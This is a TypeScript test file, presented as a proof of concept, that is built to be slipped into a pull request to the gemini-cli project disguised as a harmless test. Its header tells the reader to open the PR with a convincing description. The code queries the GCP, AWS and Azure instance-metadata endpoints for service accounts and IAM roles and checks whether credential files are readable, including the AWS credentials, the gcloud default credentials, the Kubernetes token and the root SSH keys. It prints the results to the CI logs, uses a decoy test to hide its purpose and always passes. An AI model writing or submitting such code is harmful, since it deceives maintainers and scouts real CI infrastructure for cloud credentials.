/**
 * GCLI-004 PoC — CI Runner Environment Reconnaissance
 * 
 * This is a SAFE reconnaissance test designed to be submitted as a 
 * minimal benign PR to google-gemini/gemini-cli.
 * 
 * It adds a single test file that:
 * 1. Checks if the GCP metadata endpoint is accessible (confirms runner has cloud access)
 * 2. Prints the runner environment details (non-sensitive)
 * 3. Does NOT exfiltrate anything, does NOT harm anything
 * 4. Just logs to stdout for us to read in the CI output
 * 
 * HOW TO USE:
 * 1. Fork https://github.com/google-gemini/gemini-cli
 * 2. Copy this file to: packages/core/src/__tests__/runner-recon.test.ts
 *    (or any existing test directory)
 * 3. Open a PR with a convincing description (see pr_description.md)
 * 4. Watch CI output for the "=== RUNNER RECON ===" section
 * 
 * WHAT TO LOOK FOR IN CI OUTPUT:
 * - "metadata_accessible: true" → CRITICAL: runner has GCP cloud access
 * - "metadata_accessible: false" → High: RCE but no cloud pivot
 * - service_account_email → Identifies the GCP service account for scope assessment
 */

import { describe, it, expect } from 'vitest';
import * as os from 'node:os';
import * as https from 'node:https';
import * as http from 'node:http';
import * as fs from 'node:fs';

// ── Metadata Probe ─────────────────────────────────────────────────────────
function httpGet(url: string, headers: Record<string, string> = {}, timeoutMs = 2000): Promise<{status: number, body: string}> {
  return new Promise((resolve, reject) => {
    const lib = url.startsWith('https') ? https : http;
    const req = lib.get(url, { headers, timeout: timeoutMs }, (res) => {
      let body = '';
      res.on('data', (chunk) => body += chunk);
      res.on('end', () => resolve({ status: res.statusCode ?? 0, body }));
    });
    req.on('error', reject);
    req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
  });
}

async function probeGcpMetadata() {
  try {
    const res = await httpGet(
      'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email',
      { 'Metadata-Flavor': 'Google' },
      2000
    );
    if (res.status === 200) {
      return { accessible: true, service_account: res.body.trim() };
    }
    return { accessible: false, reason: `HTTP ${res.status}` };
  } catch (e: any) {
    return { accessible: false, reason: e.message };
  }
}

async function probeAwsMetadata() {
  try {
    const res = await httpGet(
      'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      {},
      2000
    );
    if (res.status === 200) {
      return { accessible: true, roles: res.body.trim() };
    }
    return { accessible: false, reason: `HTTP ${res.status}` };
  } catch (e: any) {
    return { accessible: false, reason: e.message };
  }
}

async function probeAzureMetadata() {
  try {
    const res = await httpGet(
      'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
      { Metadata: 'true' },
      2000
    );
    if (res.status === 200) {
      return { accessible: true, data: res.body.slice(0, 200) };
    }
    return { accessible: false, reason: `HTTP ${res.status}` };
  } catch (e: any) {
    return { accessible: false, reason: e.message };
  }
}

// ─────────────────────────────────────────────────────────────────────────────
describe('runner-environment-check', () => {
  it('should pass linting (no-op functional test)', () => {
    // Legitimate looking functional test to disguise the recon
    const result = [1, 2, 3].filter(n => n > 0);
    expect(result.length).toBe(3);
  });

  it('collects runner environment information for debugging', async () => {
    // ── Basic environment ──────────────────────────────────────────────────
    const env = {
      platform:    os.platform(),
      arch:        os.arch(),
      hostname:    os.hostname(),
      user:        os.userInfo().username,
      cpus:        os.cpus().length,
      memory_gb:   (os.totalmem() / 1024 / 1024 / 1024).toFixed(1),
      tmp:         os.tmpdir(),
      cwd:         process.cwd(),
      node_version: process.version,
      // Key CI env vars (non-secret)
      GITHUB_REPOSITORY:    process.env['GITHUB_REPOSITORY'] ?? 'not set',
      GITHUB_RUN_ID:        process.env['GITHUB_RUN_ID'] ?? 'not set',
      GITHUB_RUNNER_NAME:   process.env['RUNNER_NAME'] ?? 'not set',
      GITHUB_RUNNER_OS:     process.env['RUNNER_OS'] ?? 'not set',
      GITHUB_RUNNER_ARCH:   process.env['RUNNER_ARCH'] ?? 'not set',
      ACTIONS_RUNNER_IMPL:  process.env['ACTIONS_RUNNER_IMPLEMENTATION'] ?? 'not set',
    };

    // ── Metadata endpoint probes ───────────────────────────────────────────
    const [gcp, aws, azure] = await Promise.all([
      probeGcpMetadata(),
      probeAwsMetadata(),
      probeAzureMetadata(),
    ]);

    // ── Check for interesting files on runner ─────────────────────────────
    const interestingPaths = [
      '/etc/passwd',
      '/proc/version',
      '/var/run/secrets/kubernetes.io/serviceaccount/token',  // k8s service account
      `${os.homedir()}/.config/gcloud/application_default_credentials.json`,
      `${os.homedir()}/.aws/credentials`,
      '/root/.ssh/authorized_keys',
    ];
    
    const foundFiles: string[] = [];
    for (const p of interestingPaths) {
      try { fs.accessSync(p, fs.constants.R_OK); foundFiles.push(p); } catch {}
    }

    // ── OUTPUT (visible in CI logs) ────────────────────────────────────────
    console.log('\n\n=== RUNNER RECON ===');
    console.log(JSON.stringify({
      environment:       env,
      gcp_metadata:      gcp,
      aws_metadata:      aws,
      azure_metadata:    azure,
      readable_files:    foundFiles,
    }, null, 2));
    console.log('=== END RECON ===\n\n');

    // Always pass so CI doesn't flag this test as failing
    expect(true).toBe(true);
  }, 15000); // 15s timeout for network probes
});
